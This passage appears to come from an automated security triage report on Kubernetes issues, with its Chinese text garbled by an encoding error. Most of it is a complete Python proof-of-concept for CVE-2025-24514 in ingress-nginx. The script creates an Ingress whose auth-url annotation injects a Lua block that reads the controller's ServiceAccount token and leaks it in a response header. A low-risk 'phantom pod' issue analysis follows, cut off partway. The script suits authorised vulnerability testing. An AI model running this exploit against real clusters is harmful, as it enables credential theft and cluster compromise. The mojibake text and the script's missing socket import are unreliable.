    *   **æ•æ„Ÿä¿¡æ¯æ³„éœ²**: æ”»å‡»è€…å¯èƒ½åˆ©ç”¨æ³¨å…¥çš„é…ç½®è¯»å– controller Pod å¯è®¿é—®çš„æ•æ„Ÿä¿¡æ¯ï¼Œç‰¹åˆ«æ˜¯ Kubernetes Secretsã€‚Issue ä¸­ç‰¹åˆ«æåˆ°ï¼Œåœ¨é»˜è®¤å®‰è£…ä¸‹ï¼Œcontroller é€šå¸¸æœ‰æƒé™è®¿é—®é›†ç¾¤èŒƒå›´å†…çš„æ‰€æœ‰ Secretsï¼Œè¿™æå¤§åœ°æ”¾å¤§äº†ä¿¡æ¯æ³„éœ²çš„é£é™©ã€‚
4.  **è§¦å‘æ¡ä»¶**: æ”»å‡»è€…éœ€è¦æ‹¥æœ‰åˆ›å»ºæˆ–ä¿®æ”¹ Ingress èµ„æºçš„æƒé™ (CVSS ä¸­çš„ `PR:L` - Low Privilegeï¼ŒæŒ‡éœ€è¦éç®¡ç†å‘˜ä½†å…·æœ‰ç‰¹å®šæ“ä½œæƒé™çš„ç”¨æˆ·)ã€‚
5.  **å—å½±å“ç‰ˆæœ¬**: æ˜ç¡®åˆ—å‡ºäº†å—å½±å“çš„ ingress-nginx ç‰ˆæœ¬ (< v1.11.0, v1.11.0 - 1.11.4, v1.12.0)ã€‚
6.  **ç¼“è§£æªæ–½**: å‡çº§åˆ°ä¿®å¤ç‰ˆæœ¬ (v1.11.5, v1.12.1+) æˆ–å¯ç”¨ `enable-annotation-validation` CLI å‚æ•° (v1.12.0+ é»˜è®¤å¯ç”¨)ã€‚
7.  **CVSS è¯„åˆ†**: å®˜æ–¹ç»™å‡ºçš„ CVSS 3.1 è¯„åˆ†ä¸º 8.8 (High)ï¼Œå‘é‡ä¸º `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`ã€‚è¿™è¡¨æ˜æ¼æ´å¯ä»¥é€šè¿‡ç½‘ç»œåˆ©ç”¨ (`AV:N`)ï¼Œåˆ©ç”¨å¤æ‚åº¦ä½ (`AC:L`)ï¼Œéœ€è¦è¾ƒä½æƒé™ (`PR:L`)ï¼Œä¸éœ€è¦ç”¨æˆ·äº¤äº’ (`UI:N`)ï¼Œå½±å“èŒƒå›´ä¸å˜ (`S:U`)ï¼Œä½†å¯¹æœºå¯†æ€§ (`C:H`)ã€å®Œæ•´æ€§ (`I:H`) å’Œå¯ç”¨æ€§ (`A:H`) éƒ½æœ‰é«˜å½±å“ã€‚
8.  **è§„åˆ™åŒ¹é…**:
    *   è§„åˆ™ 3: CVSS 8.8 > Highï¼Œåˆ¤æ–­ä¸ºé«˜é£é™©ã€‚
    *   è§„åˆ™ 7: æ˜ç¡®æåˆ°å¯èƒ½å¯¼è‡´"ä»»æ„ä»£ç æ‰§è¡Œ"ï¼Œå¿…é¡»åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚
    *   è§„åˆ™ 8: ä½æƒé™ç”¨æˆ· (èƒ½åˆ›å»º Ingress) å¯ä»¥å½±å“æ•´ä¸ª ingress controllerï¼Œè¿›è€Œå¯èƒ½å½±å“é›†ç¾¤ä¸­çš„æ‰€æœ‰ç”¨æˆ·å’Œè®¿é—®æ‰€æœ‰ Secretï¼Œç¬¦åˆé«˜é£é™©åœºæ™¯ã€‚
    *   è§„åˆ™ 5: è™½ç„¶éœ€è¦ä½æƒé™ï¼Œä½†ç”±äºæ˜¯ RCE (è§„åˆ™ 7)ï¼Œä¸é™çº§ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import kubernetes
import time
import threading
import http.server
import socketserver
import requests
import sys
import signal
import os

# --- é…ç½® ---
NAMESPACE = "default"  # ç›®æ ‡å‘½åç©ºé—´
INGRESS_NAME = "poc-ingress-cve-2025-24514"
SERVICE_NAME = "dummy-service" # éœ€è¦ä¸€ä¸ªåç«¯æœåŠ¡ï¼Œå¯ä»¥ä¸å­˜åœ¨ï¼Œä»…ç”¨äºIngressè§„åˆ™
SERVICE_PORT = 80
AUTH_SERVER_PORT = 10888 # æœ¬åœ°ç›‘å¬çš„å‡è®¤è¯æœåŠ¡å™¨ç«¯å£
TIMEOUT_SECONDS = 120 # è„šæœ¬æ€»æ‰§è¡Œè¶…æ—¶æ—¶é—´

# --- æ¶æ„ Payload ---
# è¿™ä¸ª Payload å°è¯•æ³¨å…¥ Lua ä»£ç å— (éœ€è¦ ingress-nginx å¯ç”¨ Lua æ¨¡å—)
# å®ƒä¼šè¯»å– ServiceAccount Token å¹¶å°†å…¶æ”¾å…¥å“åº”å¤´ X-Leaked-Token ä¸­
# æ³¨æ„ï¼šå®é™…æ³¨å…¥çš„ payload å–å†³äº ingress-nginx å¦‚ä½•å¤„ç† annotation ä¸­çš„æ¢è¡Œç¬¦å’Œç‰¹æ®Šå­—ç¬¦
# è¿™ä¸ª payload å‡è®¾ '}' å¯ä»¥é—­åˆæŸä¸ªä¸Šä¸‹æ–‡ï¼Œç„¶åæ³¨å…¥ lua_block
# å¹¶ä½¿ç”¨ '#' æ³¨é‡Šæ‰å¯èƒ½çš„åç»­å†…å®¹ã€‚
# ä½¿ç”¨ä¸€ä¸ªæœ¬åœ°ä¸å­˜åœ¨çš„è®¤è¯ URLï¼Œæ³¨å…¥ç‚¹åœ¨äº Nginx é…ç½®ç”Ÿæˆè¿‡ç¨‹
PAYLOAD = f'http://127.0.0.1:{AUTH_SERVER_PORT}/auth"}} \n lua_block {{ local f = io.open("/var/run/secrets/kubernetes.io/serviceaccount/token", "r"); if f then local token = f:read("*a"); f:close(); ngx.header["X-Leaked-Token"] = token; else ngx.header["X-Leaked-Token"] = "Error-Reading-Token"; end }} \n # '

# --- å…¨å±€å˜é‡ ---
stop_event = threading.Event()
ingress_client = None
core_client = None
server_thread = None
httpd = None

# --- HTTP æœåŠ¡å™¨ ---
class SimpleAuthHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        print(f"[+] Dummy Auth Server received request: {self.path}")
        self.send_response(401) # è¿”å› 401 æœªæˆæƒï¼Œæ¨¡æ‹Ÿè®¤è¯å¤±è´¥
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"Unauthorized by dummy server")

def run_dummy_auth_server(port):
    global httpd
    try:
        socketserver.TCPServer.allow_reuse_address = True
        httpd = socketserver.TCPServer(("", port), SimpleAuthHandler)
        print(f"[+] Starting dummy auth server on port {port}")
        httpd.serve_forever()
    except OSError as e:
        print(f"[!] Error starting dummy auth server: {e}", file=sys.stderr)
        stop_event.set() # Signal main thread to stop if server fails
    except Exception as e:
        print(f"[!] Unexpected error in dummy auth server: {e}", file=sys.stderr)
    finally:
        if httpd:
            httpd.server_close()
        print("[+] Dummy auth server stopped.")

# --- è¶…æ—¶å¤„ç† ---
def signal_handler(signum, frame):
    print("[!] Script timeout reached.", file=sys.stderr)
    stop_event.set()
    if httpd:
        # Need to call shutdown from another thread if serve_forever is blocking
        threading.Thread(target=httpd.shutdown).start()

# --- ä¸»é€»è¾‘ ---
def create_malicious_ingress():
    print("[*] Creating malicious Ingress...")
    ingress_body = {
        "apiVersion": "networking.k8s.io/v1",
        "kind": "Ingress",
        "metadata": {
            "name": INGRESS_NAME,
            "namespace": NAMESPACE,
            "annotations": {
                # æŒ‡å®šä½¿ç”¨ nginx ingress controller
                "kubernetes.io/ingress.class": "nginx",
                # æ³¨å…¥ç‚¹ï¼šauth-url
                "nginx.ingress.kubernetes.io/auth-url": PAYLOAD,
                # å¯èƒ½éœ€è¦é…åˆ auth-signin ä»¥ä¾¿åœ¨è®¤è¯å¤±è´¥æ—¶è§‚å¯Ÿæ•ˆæœï¼Œä½†ä¸»è¦ä¾èµ–äºé…ç½®æ³¨å…¥æœ¬èº«
                # "nginx.ingress.kubernetes.io/auth-signin": "http://$host/oauth2/start?rd=$request_uri"
            }
        },
        "spec": {
            "rules": [{
                "host": f"{INGRESS_NAME}.example.com", # ä½¿ç”¨ä¸€ä¸ªè™šæ‹ŸåŸŸå
                "http": {
                    "paths": [{
                        "path": "/",
                        "pathType": "Prefix",
                        "backend": {
                            "service": {
                                "name": SERVICE_NAME,
                                "port": {
                                    "number": SERVICE_PORT
                                }
                            }
                        }
                    }]
                }
            }]
        }
    }
    try:
        api_response = ingress_client.create_namespaced_ingress(
            body=ingress_body, namespace=NAMESPACE
        )
        print(f"[+] Malicious Ingress '{INGRESS_NAME}' created.")
        return True
    except kubernetes.client.ApiException as e:
        print(f"[!] Failed to create Ingress: {e}", file=sys.stderr)
        # If Ingress already exists, maybe try to update it (requires patch permission)
        # For simplicity, we'll just error out here.
        return False
    except Exception as e:
        print(f"[!] An unexpected error occurred during Ingress creation: {e}", file=sys.stderr)
        return False

def get_ingress_ip(retry_count=10, delay=5):
    print("[*] Waiting for Ingress controller to assign IP/Hostname...")
    for i in range(retry_count):
        if stop_event.is_set(): return None
        try:
            ingress = ingress_client.read_namespaced_ingress_status(INGRESS_NAME, NAMESPACE)
            if ingress.status.load_balancer and ingress.status.load_balancer.ingress:
                ingress_info = ingress.status.load_balancer.ingress[0]
                if ingress_info.ip:
                    print(f"[+] Ingress IP found: {ingress_info.ip}")
                    return ingress_info.ip
                if ingress_info.hostname:
                    print(f"[+] Ingress Hostname found: {ingress_info.hostname}")
                    # Try to resolve hostname, might fail in some environments
                    try:
                        ip = socket.gethostbyname(ingress_info.hostname)
                        print(f"[+] Resolved {ingress_info.hostname} to {ip}")
                        return ip
                    except socket.gaierror:
                        print(f"[!] Could not resolve hostname {ingress_info.hostname}. Using hostname directly.", file=sys.stderr)
                        # Fallback to returning hostname, requests might handle it
                        return ingress_info.hostname
            print(f"[*] Ingress IP/Hostname not available yet. Retrying in {delay}s... ({i+1}/{retry_count})")
            time.sleep(delay)
        except kubernetes.client.ApiException as e:
            print(f"[!] Error reading Ingress status: {e}", file=sys.stderr)
            # Handle cases where Ingress might not be found immediately after creation
            if e.status == 404:
                print("[*] Ingress not found yet, retrying...")
            else:
                return None # Other API error
            time.sleep(delay)
        except Exception as e:
            print(f"[!] An unexpected error occurred while getting Ingress IP: {e}", file=sys.stderr)
            return None
    print("[!] Timed out waiting for Ingress IP/Hostname.", file=sys.stderr)
    return None

def test_exploit(target_ip_or_host):
    url = f"http://{target_ip_or_host}/"
    headers = {"Host": f"{INGRESS_NAME}.example.com"} # Match the host rule in Ingress
    print(f"[*] Sending request to {url} with Host header '{headers['Host']}'...")
    try:
        # Allow redirects and disable SSL verification for flexibility
        response = requests.get(url, headers=headers, timeout=10, allow_redirects=True, verify=False)
        print(f"[*] Received response status code: {response.status_code}")
        # Check if the injected header is present
        if "X-Leaked-Token" in response.headers:
            leaked_token = response.headers["X-Leaked-Token"]
            if "Error-Reading-Token" in leaked_token:
                 print("[!] Exploit might have worked, but failed to read token (permissions? path?). Header found: X-Leaked-Token={leaked_token}")
            else:
                print(f"[+] !!! VULNERABILITY CONFIRMED !!! Leaked Token (first 50 chars): {leaked_token[:50]}...")
                print(f"[+] Full Header: X-Leaked-Token={leaked_token}")

            # Even if the header indicates an error reading the token,
            # the presence of the header itself confirms successful configuration injection.
            print("[+] Configuration injection seems successful based on header presence.")

        else:
            print("[-] Leaked token header 'X-Leaked-Token' not found in response headers.")
            # print("[-] Response Headers:")
            # for k, v in response.headers.items():
            #     print(f"    {k}: {v}")
            # print("[-] Response Body (first 200 chars):")
            # print(response.text[:200])

    except requests.exceptions.ConnectionError as e:
        print(f"[!] Connection failed: {e}", file=sys.stderr)
        print("[!] This could be due to networking issues, the Ingress controller not being ready, or the IP/hostname being incorrect.")
    except requests.exceptions.Timeout:
        print("[!] Request timed out.", file=sys.stderr)
    except requests.exceptions.RequestException as e:
        print(f"[!] An error occurred during the request: {e}", file=sys.stderr)

def cleanup():
    print("[*] Cleaning up...")
    if ingress_client:
        try:
            print(f"[*] Deleting Ingress '{INGRESS_NAME}'...")
            ingress_client.delete_namespaced_ingress(INGRESS_NAME, NAMESPACE)
            # Wait a bit for deletion to be processed
            time.sleep(5)
            print(f"[+] Ingress '{INGRESS_NAME}' deleted.")
        except kubernetes.client.ApiException as e:
            # Ignore 404 Not Found errors during cleanup
            if e.status != 404:
                print(f"[!] Failed to delete Ingress: {e}", file=sys.stderr)
        except Exception as e:
            print(f"[!] An unexpected error occurred during Ingress deletion: {e}", file=sys.stderr)

    if server_thread and server_thread.is_alive():
        print("[*] Stopping dummy auth server...")
        if httpd:
             # Shutdown needs to be called from a separate thread if called while serve_forever is running
             threading.Thread(target=httpd.shutdown).start()
        else:
             # If httpd failed to start, ensure the thread stops
             stop_event.set() # Signal thread to potentially exit loop if waiting
        server_thread.join(timeout=5) # Wait for thread to finish
        if server_thread.is_alive():
            print("[!] Server thread did not stop gracefully.", file=sys.stderr)

def main():
    global ingress_client, core_client, server_thread

    # Set timeout alarm
    signal.signal(signal.SIGALRM, signal_handler)
    signal.alarm(TIMEOUT_SECONDS)

    # Disable insecure request warnings from requests package
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

    print(f"[*] Starting CVE-2025-24514 PoC against ingress-nginx.")
    print(f"[*] Target Namespace: {NAMESPACE}")
    print(f"[*] Ingress Name: {INGRESS_NAME}")
    print(f"[*] Payload Type: Lua injection attempting ServiceAccount token leak")
    print(f"[*] Timeout: {TIMEOUT_SECONDS} seconds")

    # Start dummy auth server in a background thread
    server_thread = threading.Thread(target=run_dummy_auth_server, args=(AUTH_SERVER_PORT,))
    server_thread.daemon = True # Allows main thread to exit even if this thread is running
    server_thread.start()
    time.sleep(1) # Give server a moment to start

    # Check if server thread is alive
    if not server_thread.is_alive() and stop_event.is_set():
        print("[!] Dummy auth server failed to start. Aborting.", file=sys.stderr)
        cleanup()
        return

    try:
        # Load Kubernetes configuration from default location (~/.kube/config)
        print("[*] Loading Kubernetes configuration...")
        try:
            kubernetes.config.load_kube_config()
            configuration = kubernetes.client.Configuration.get_default_copy()
            # Set a reasonable timeout for API calls
            configuration.timeout_seconds = 30
            kubernetes.client.Configuration.set_default(configuration)

        except kubernetes.config.ConfigException as e:
            print(f"[!] Could not load Kubernetes configuration: {e}", file=sys.stderr)
            print("[!] Ensure KUBECONFIG is set or config is in the default location.", file=sys.stderr)
            stop_event.set()
            return
        except Exception as e:
            print(f"[!] An unexpected error occurred during K8s config loading: {e}", file=sys.stderr)
            stop_event.set()
            return

        print("[+] Kubernetes configuration loaded.")
        api_client = kubernetes.client.ApiClient()
        ingress_client = kubernetes.client.NetworkingV1Api(api_client)
        core_client = kubernetes.client.CoreV1Api(api_client) # May need CoreV1Api for other checks if necessary

        # 1. Create the malicious Ingress
        if not stop_event.is_set() and create_malicious_ingress():
            # 2. Wait for the Ingress controller to assign an IP or Hostname
            target = get_ingress_ip()

            # 3. If IP/Hostname obtained, send request and check for leak
            if target and not stop_event.is_set():
                # Add a small delay for Nginx config reload
                print("[*] Waiting a few seconds for nginx config reload...")
                time.sleep(10)
                test_exploit(target)
            elif not target:
                print("[!] Could not obtain Ingress IP/Hostname. Cannot test exploit.", file=sys.stderr)

    except Exception as e:
        print(f"[!] An unexpected error occurred in main execution: {e}", file=sys.stderr)
    finally:
        # 4. Cleanup
        cleanup()
        signal.alarm(0) # Disable the alarm
        print("[*] PoC script finished.")

# Call the main function directly as per requirements
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

1.  **ç›®çš„**: è¯¥è„šæœ¬æ—¨åœ¨é€šè¿‡åˆ›å»ºä¸€ä¸ªæ¶æ„çš„ Kubernetes Ingress èµ„æºæ¥æ¼”ç¤º CVE-2025-24514 æ¼æ´ã€‚è¯¥æ¼æ´å…è®¸é€šè¿‡ `nginx.ingress.kubernetes.io/auth-url` æ³¨è§£æ³¨å…¥ Nginx é…ç½®ã€‚
2.  **å·¥ä½œæµç¨‹**:
    *   **é…ç½®åŠ è½½**: è„šæœ¬é¦–å…ˆå°è¯•ä»é»˜è®¤ä½ç½® (`~/.kube/config` æˆ– KUBECONFIG ç¯å¢ƒå˜é‡æŒ‡å®šçš„ä½ç½®) åŠ è½½ Kubernetes é›†ç¾¤çš„è¿æ¥é…ç½®ã€‚
    *   **è™šæ‹Ÿè®¤è¯æœåŠ¡å™¨**: åœ¨æœ¬åœ°å¯åŠ¨ä¸€ä¸ªç®€å•çš„ HTTP æœåŠ¡å™¨ (`run_dummy_auth_server`)ï¼Œç›‘å¬åœ¨ `AUTH_SERVER_PORT` (10888) ç«¯å£ã€‚è¿™ä¸ªæœåŠ¡å™¨ä»…ç”¨äºä½œä¸º `auth-url` çš„ç›®æ ‡ï¼Œå®é™…çš„æ¼æ´åˆ©ç”¨ä¸ä¾èµ–äºè¯¥æœåŠ¡å™¨çš„å“åº”ï¼Œè€Œæ˜¯ä¾èµ–äº `auth-url` å­—ç¬¦ä¸²æœ¬èº«è¢«ä¸å®‰å…¨åœ°æ’å…¥ Nginx é…ç½®ä¸­ã€‚æœåŠ¡å™¨ä¼šç®€å•åœ°è¿”å› 401 æœªæˆæƒã€‚
    *   **æ¶æ„ Ingress åˆ›å»º**:
        *   å®šä¹‰ä¸€ä¸ª Ingress å¯¹è±¡çš„ Python å­—å…¸ (`create_malicious_ingress`)ã€‚
        *   å…³é”®åœ¨äº `metadata.annotations` ä¸­çš„ `nginx.ingress.kubernetes.io/auth-url`ã€‚è¿™é‡ŒåŒ…å«äº†ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„å­—ç¬¦ä¸² (`PAYLOAD`)ã€‚
        *   `PAYLOAD` è¯•å›¾åˆ©ç”¨ Nginx é…ç½®æ¨¡æ¿å¤„ç†æ³¨è§£å€¼æ—¶å¯èƒ½å­˜åœ¨çš„ç¼ºé™·ï¼ˆå¦‚æœªæ­£ç¡®å¤„ç†æ¢è¡Œç¬¦æˆ–ç‰¹æ®Šå­—ç¬¦ï¼‰ï¼Œæ³¨å…¥ä¸€ä¸ª Lua ä»£ç å— (`lua_block {...}`). **æ³¨æ„**: è¿™ä¾èµ–äºç›®æ ‡ ingress-nginx æ§åˆ¶å™¨å·²å¯ç”¨ Lua æ¨¡å—ã€‚
        *   æ³¨å…¥çš„ Lua ä»£ç å°è¯•æ‰“å¼€å¹¶è¯»å–è¿è¡Œ Pod çš„ Service Account ä»¤ç‰Œæ–‡ä»¶ (`/var/run/secrets/kubernetes.io/serviceaccount/token`)ï¼Œç„¶åå°†ä»¤ç‰Œå†…å®¹è®¾ç½®åˆ°ä¸€ä¸ªè‡ªå®šä¹‰çš„ HTTP å“åº”å¤´ `X-Leaked-Token` ä¸­ã€‚å¦‚æœè¯»å–å¤±è´¥ï¼Œåˆ™è®¾ç½®ä¸€ä¸ªé”™è¯¯æ ‡è¯†ã€‚
        *   ä½¿ç”¨ `kubernetes` Python åº“å°†è¿™ä¸ª Ingress å¯¹è±¡åˆ›å»ºåœ¨æŒ‡å®šçš„ `NAMESPACE` (é»˜è®¤ä¸º "default") ä¸­ã€‚
    *   **è·å– Ingress IP**: è„šæœ¬ä¼šè½®è¯¢ (`get_ingress_ip`) ç­‰å¾… Kubernetes å°†ä¸€ä¸ªå¤–éƒ¨å¯è®¿é—®çš„ IP åœ°å€æˆ–ä¸»æœºååˆ†é…ç»™æ–°åˆ›å»ºçš„ Ingress èµ„æºã€‚è¿™æ˜¯è®¿é—®è¢«æ³¨å…¥é…ç½®çš„ Nginx å®ä¾‹æ‰€å¿…éœ€çš„ã€‚
    *   **æ¼æ´éªŒè¯**:
        *   ä¸€æ—¦è·å–åˆ° IP æˆ–ä¸»æœºå (`target`)ï¼Œè„šæœ¬ä¼šç­‰å¾…ä¸€å°æ®µæ—¶é—´ï¼Œè®© ingress-nginx æ§åˆ¶å™¨æœ‰æ—¶é—´æ£€æµ‹åˆ°æ–°çš„ Ingress å¯¹è±¡å¹¶æ›´æ–°å…¶å†…éƒ¨çš„ Nginx é…ç½®ã€‚
        *   ç„¶åï¼Œè„šæœ¬ä½¿ç”¨ `requests` åº“å‘ Ingress çš„åœ°å€å‘é€ä¸€ä¸ª HTTP GET è¯·æ±‚ (`test_exploit`)ã€‚è¯·æ±‚ä¸­åŒ…å« `Host` å¤´ï¼Œä»¥åŒ¹é… Ingress è§„åˆ™ä¸­å®šä¹‰çš„åŸŸå (`poc-ingress-cve-2025-24514.example.com`)ã€‚
        *   è„šæœ¬æ£€æŸ¥æ”¶åˆ°çš„ HTTP å“åº”å¤´ã€‚å¦‚æœå“åº”å¤´ä¸­å­˜åœ¨ `X-Leaked-Token`ï¼Œæ— è®ºå…¶å€¼æ˜¯å®é™…çš„ä»¤ç‰Œè¿˜æ˜¯é”™è¯¯ä¿¡æ¯ï¼Œéƒ½è¡¨æ˜é…ç½®æ³¨å…¥æˆåŠŸï¼Œå› ä¸ºè¿™ä¸ªå¤´æ˜¯æ¶æ„æ³¨å…¥çš„ Lua ä»£ç æ·»åŠ çš„ã€‚è„šæœ¬ä¼šæ‰“å°å‡ºéƒ¨åˆ†æ³„éœ²çš„ä»¤ç‰Œï¼ˆå¦‚æœæˆåŠŸè¯»å–ï¼‰æˆ–ç¡®è®¤é…ç½®æ³¨å…¥æˆåŠŸã€‚
    *   **æ¸…ç†**: æ— è®ºæˆåŠŸä¸å¦ï¼Œè„šæœ¬æœ€ç»ˆä¼šå°è¯•åˆ é™¤åˆ›å»ºçš„æ¶æ„ Ingress èµ„æº (`cleanup`)ï¼Œå¹¶åœæ­¢æœ¬åœ°çš„è™šæ‹Ÿè®¤è¯æœåŠ¡å™¨ã€‚
    *   **è¶…æ—¶ä¸é”™è¯¯å¤„ç†**: è„šæœ¬åŒ…å«ä¸€ä¸ªæ€»æ‰§è¡Œè¶…æ—¶ (`TIMEOUT_SECONDS`)ï¼Œä»¥åŠé’ˆå¯¹ K8s API è°ƒç”¨ã€ç½‘ç»œè¯·æ±‚å’ŒæœåŠ¡å™¨å¯åŠ¨çš„é”™è¯¯å¤„ç†ã€‚
3.  **è¿è¡Œå‰æ**:
    *   æœ¬åœ°å®‰è£…äº† Python 3 åŠ `kubernetes`, `requests` åº“ (`pip install kubernetes requests`)ã€‚
    *   æ‹¥æœ‰è®¿é—®ç›®æ ‡ Kubernetes é›†ç¾¤çš„ `kubeconfig` æ–‡ä»¶ï¼Œå¹¶ä¸”è¯¥é…ç½®å…·æœ‰åœ¨ç›®æ ‡å‘½åç©ºé—´ (`default`) ä¸­åˆ›å»ºå’Œåˆ é™¤ Ingress èµ„æºçš„æƒé™ã€‚
    *   ç›®æ ‡é›†ç¾¤ä¸­è¿è¡Œç€å— CVE-2025-24514 å½±å“çš„ `ingress-nginx` ç‰ˆæœ¬ï¼Œä¸”æœªå¯ç”¨ `enable-annotation-validation`ã€‚
    *   ç›®æ ‡ `ingress-nginx` æ§åˆ¶å™¨éœ€è¦å¯ç”¨äº† Lua æ¨¡å—ï¼Œä»¥ä¾¿ PoC ä¸­çš„ Lua Payload èƒ½å¤Ÿæ‰§è¡Œã€‚ï¼ˆå¦‚æœæœªå¯ç”¨ Luaï¼Œåˆ™éœ€è¦ä¿®æ”¹ `PAYLOAD` ä¸ºå…¶ä»–ä¸ä¾èµ– Lua çš„ Nginx é…ç½®æ³¨å…¥æ–¹å¼ï¼Œä½†è¿™æ›´å¤æ‚ä¸”ä¾èµ–å…·ä½“çš„ Nginx é…ç½®æ¨¡æ¿ç»†èŠ‚ï¼‰ã€‚
    *   è„šæœ¬è¿è¡Œç¯å¢ƒéœ€è¦èƒ½å¤Ÿè®¿é—®åˆ° Kubernetes API Server å’Œåˆ†é…ç»™ Ingress çš„ IP/ä¸»æœºåã€‚
4.  **å®‰å…¨æ€§**: æ­¤è„šæœ¬ä»…ç”¨äºæ•™è‚²ç›®çš„å’Œåœ¨æˆæƒç¯å¢ƒä¸­æµ‹è¯•æ¼æ´ã€‚è·å–åˆ°çš„ Service Account ä»¤ç‰Œå¯èƒ½å…·æœ‰æ•æ„Ÿæƒé™ï¼Œè¯·å‹¿åœ¨ç”Ÿäº§ç¯å¢ƒæˆ–æœªç»æˆæƒçš„ç³»ç»Ÿä¸Šè¿è¡Œæ­¤è„šæœ¬ã€‚

---


# âš ï¸ å­˜åœ¨ä½é£é™©çš„ Issues (13 ä¸ª)

## Issue #131115 Kubelet can host "phantom" pod upon etcd restore.

- Issue é“¾æ¥ï¼š[#131115](https://github.com/kubernetes/kubernetes/issues/131115)

### Issue å†…å®¹

#### What happened?

Hi, we found a situation similar to https://github.com/kubernetes/kubernetes/issues/115325, while caused by etcd being restored to a previous snapshot, which "erased" a created pod.

Kubelet complains resource problem and fails newly scheduled pods, as if the original pod is still there (well, it is).

#### What did you expect to happen?

Kubelet should have some warning and ideally reconnect to apiserver and remove the "phantom" pod as a orphaned pod.

#### How can we reproduce it (as minimally and precisely as possible)?

See https://github.com/tdihp/myakshack/tree/main/repros/phantompod for a tested working repro, while to describe on how to reproduce this in simple words:

1. take a etcd backup
2. provision a pod until it is running in kubelet
3. take etcd down, and restore it to backup
4. restart etcd, kube-apiserver, kube-controller-manager and kube-scheduler, notice kubelet isn't restarted.
5. The pod will be gone, while will be running if we do crictl on the node.


#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

Tested across v1.29 ~ 1.32

</details>


#### Cloud provider

<details>
Not relevant, but might impact any cloud provider that restores ETCD.
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
1.  **é—®é¢˜æè¿°:** è¯¥ Issue æè¿°äº†ä¸€ä¸ªåœ¨ etcd ä»å¤‡ä»½æ¢å¤åå¯èƒ½å‡ºç°çš„é—®é¢˜ã€‚å½“ etcd æ¢å¤åˆ°ä¸€ä¸ª Pod å·²ç»è¢«è°ƒåº¦åˆ° Kubelet è¿è¡Œä¹‹å‰çš„å¿«ç…§çŠ¶æ€æ—¶ï¼ŒAPI Server ä¼šå¤±å»è¯¥ Pod çš„è®°å½•ã€‚ç„¶è€Œï¼Œå¦‚æœ Kubelet æ²¡æœ‰è¢«é‡å¯ï¼Œå®ƒä¼šç»§ç»­è¿è¡Œè¿™ä¸ª Podï¼ˆç§°ä¸º "phantom" podï¼‰ï¼Œå¹¶è®¤ä¸ºè¯¥ Pod ä»åœ¨æ¶ˆè€—èŠ‚ç‚¹èµ„æºã€‚
2.  **æ½œåœ¨å½±å“:**
    *   **èµ„æºå ç”¨:** "phantom" pod æŒç»­åœ¨èŠ‚ç‚¹ä¸Šè¿è¡Œå¹¶å ç”¨ CPUã€å†…å­˜ç­‰èµ„æºã€‚
    *   **è°ƒåº¦å¤±è´¥ (DoS):** ç”±äº Kubelet è®¤ä¸ºèŠ‚ç‚¹èµ„æºå·²è¢« "phantom" pod å ç”¨ï¼Œå½“æ–°çš„ Pod éœ€è¦è¢«è°ƒåº¦åˆ°è¯¥èŠ‚ç‚¹æ—¶ï¼ŒKubelet å¯èƒ½ä¼šå› ä¸ºèµ„æºä¸è¶³ï¼ˆå¦‚ CPUã€å†…å­˜ä¸è¶³ï¼‰è€Œæ‹’ç»æ¥æ”¶ï¼Œå¯¼è‡´æ–° Pod è°ƒåº¦å¤±è´¥ã€‚è¿™æ„æˆäº†å¯¹è¯¥èŠ‚ç‚¹èµ„æºçš„æ‹’ç»æœåŠ¡ï¼ˆDenial of Serviceï¼‰ã€‚
    *   **çŠ¶æ€ä¸ä¸€è‡´:** é›†ç¾¤çš„æ§åˆ¶å¹³é¢ï¼ˆAPI Server/etcdï¼‰ä¸èŠ‚ç‚¹ï¼ˆKubeletï¼‰çš„çŠ¶æ€ä¸ä¸€è‡´ï¼Œæ§åˆ¶å¹³é¢è®¤ä¸ºèŠ‚ç‚¹æœ‰å¯ç”¨èµ„æºï¼Œè€Œ Kubelet è®¤ä¸ºèµ„æºå·²è¢«å ç”¨ã€‚
3.  **é£é™©åˆ†æ:**
    *   è¯¥é—®é¢˜æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªçŠ¶æ€ä¸ä¸€è‡´å¯¼è‡´çš„èµ„æºå¯ç”¨æ€§é—®é¢˜ï¼Œå¯ä»¥çœ‹ä½œæ˜¯ä¸€ç§æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ã€‚æ–° Pod æ— æ³•è°ƒåº¦åˆ°å—å½±å“çš„èŠ‚ç‚¹ä¸Šã€‚
    *   **è§¦å‘æ¡ä»¶:** è§¦å‘æ­¤é—®é¢˜éœ€è¦éå¸¸é«˜çš„æƒé™å’Œå¤æ‚çš„æ“ä½œï¼š
        *   èƒ½å¤Ÿè®¿é—® etcd å¹¶æ‰§è¡Œå¤‡ä»½å’Œæ¢å¤æ“ä½œã€‚
        *   èƒ½å¤Ÿé‡å¯æ§åˆ¶å¹³é¢ç»„ä»¶ï¼ˆkube-apiserver, kube-controller-manager, kube-schedulerï¼‰è€Œä¸é‡å¯ Kubeletã€‚
        *   éœ€è¦ç²¾ç¡®çš„æ—¶é—´çª—å£ï¼ˆåœ¨ Pod åˆ›å»ºè¿è¡Œåå¤‡ä»½ï¼Œåœ¨ etcd æ¢å¤å‰ Pod ä»åœ¨è¿è¡Œï¼‰ã€‚
    *   **CVSS 3.1 è¯„ä¼°:**
        *   **Attack Vector (AV): Network** (å‡è®¾ etcd æ“ä½œå’Œç»„ä»¶é‡å¯é€šè¿‡ç½‘ç»œç®¡ç†æ¥å£è¿›è¡Œ)
